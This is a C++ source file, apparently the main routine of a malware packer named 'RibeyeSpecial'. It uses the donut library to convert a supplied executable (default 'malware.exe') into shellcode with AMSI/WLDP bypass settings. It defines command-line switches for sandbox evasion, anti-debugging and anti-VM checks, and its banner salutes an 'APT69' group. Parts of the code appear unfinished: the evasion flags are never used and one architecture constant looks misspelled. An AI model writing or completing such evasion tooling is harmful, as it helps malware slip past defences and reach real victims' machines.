// RibeyeSpecial.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
#include <Windows.h>
#include <iostream>
#include <fstream>
#include "donut.h"
#include "tclap/CmdLine.h"
#include "Helper.h"
#include "RibeyeBone64.h"
#include "RibeyeBone86.h"

#pragma comment(lib, "donut.lib")

// Struct that will determine the configuration to run this
struct Coconut
{
	int AES_Key = 0;
	bool sleep = false;
	int sleepTime = 5000;
	bool prime = false;
	bool mouse = false;
	bool acceleratedsleep = false;
	bool debugger = false;
	bool ram = false;
	bool cpu_core = true;
	int szData = 0;
	const char * opcodes = 0;
} coconut;



int writeShellCode(const char * file)
{
	DONUT_CONFIG c;

	// zero initialize configuration
	memset(&c, 0, sizeof(c));

	// default type is position independent code for dual-mode (x86 + amd64)
	c.inst_type = DONUT_INSTANCE_PIC;
	c.arch = DONUT_ARCH_X84;
	c.bypass = DONUT_BYPASS_SKIP;  // continues loading even if disabling AMSI/WLDP fails
	c.compress = 0;                      // compression is not implemented yet
	c.encode = 0;                      // don't encode with base64
	c.thread = 0;                      // run entrypoint for unmanaged EXE without thread
	c.ansi = 0;                      // command line will be converted to unicode
	c.exit = 0;                      // don't call RtlExitUserProcess to terminate host process
	c.mod_type = DONUT_MODULE_EXE;
	memcpy(c.file, file, strlen(file));

	char  * buffer = new char[3097152];
	std::ifstream infile(file);
	//get length of file
	infile.seekg(0, std::ios::end);
	size_t length = infile.tellg();
	infile.seekg(0, std::ios::beg);

	// don't overflow the buffer!
	if (length > 3097152)
	{
		length = 3097152;
	}
	printf("length: %d\n", length);

	//read file
	infile.read(buffer, length);

	DonutCreate(&c);

	printf("%x %x %x %x %x %x\n", *(BYTE*)c.pic, *(BYTE*)((char*)c.pic + 1), *(BYTE*)((char*)c.pic + 2), *(BYTE*)((char*)c.pic + 3), *(BYTE*)((char*)c.pic + 4), *(BYTE*)((char*)c.pic + 5));



	return 1;
}

int main(int argc, char** argv)
{
	try {

		// Define the command line object, and insert a message
		// that describes the program. The "Command description message"
		// is printed last in the help text. The second argument is the
		// delimiter (usually space) and the last one is the version number.
		// The CmdLine object parses the argv array based on the Arg objects
		// that it contains.


		//                     MESSAGE                 DELIMITER  VERSION
		TCLAP::CmdLine cmd(R"(Shoutout to APT69 and the brothers that are in it. https://twitter.com/TomahawkApt69 )", ' ', "0.1");

		TCLAP::ValueArg<std::string> filepath("f", "file", "Path to file to execute", true, "C:\\Users\\Dev\\Desktop\\malware.exe", "string");
		TCLAP::ValueArg<int> sleeptime("t", "sleeptime", "How long to sleep for (in ms) if -s is enabled", false , 5000, "integer");

		// Add the argument nameArg to the CmdLine object. The CmdLine object
		// uses this Arg to parse the command line.
		cmd.add(filepath);
		cmd.add(sleeptime);

		TCLAP::SwitchArg bSleep("s", "sleep", "Sleep to evade sandbox", cmd, false);
		TCLAP::SwitchArg bPrime("p", "prime", "Prime calculation to evade sandbox", cmd, false);
		TCLAP::SwitchArg bMouse("m", "mouse", "Check mouse movement, evade sandbox", cmd, false);
		TCLAP::SwitchArg bAccel("a", "accel", "Check if sleep is being accelerated, evade sandbox", cmd, false);
		TCLAP::SwitchArg bDebugger("d", "debugger", "Check if we are being debugged, anti debug", cmd, false);
		TCLAP::SwitchArg bRam("r", "ram", "Check RAM size, anti VM", cmd, false);
		TCLAP::SwitchArg bCore("c", "core", "Check CPU core count, anti VM", cmd, false);

		// Parse the argv array.
		cmd.parse(argc, argv);

		coconut.sleep = bSleep.getValue();
		coconut.sleepTime = sleeptime.getValue();
		coconut.prime = bPrime.getValue();
		coconut.mouse = bMouse.getValue();
		coconut.acceleratedsleep = bAccel.getValue();
		coconut.debugger = bDebugger.getValue();
		coconut.ram = bRam.getValue();
		coconut.cpu_core = bCore.getValue();;
		
		std::string targetFile = filepath.getValue();

		writeShellCode(targetFile.data());

	}
	catch (TCLAP::ArgException &e)  // catch any exceptions
	{
		std::cerr << "error: " << e.error() << " for arg " << e.argId() << std::endl;
	}

}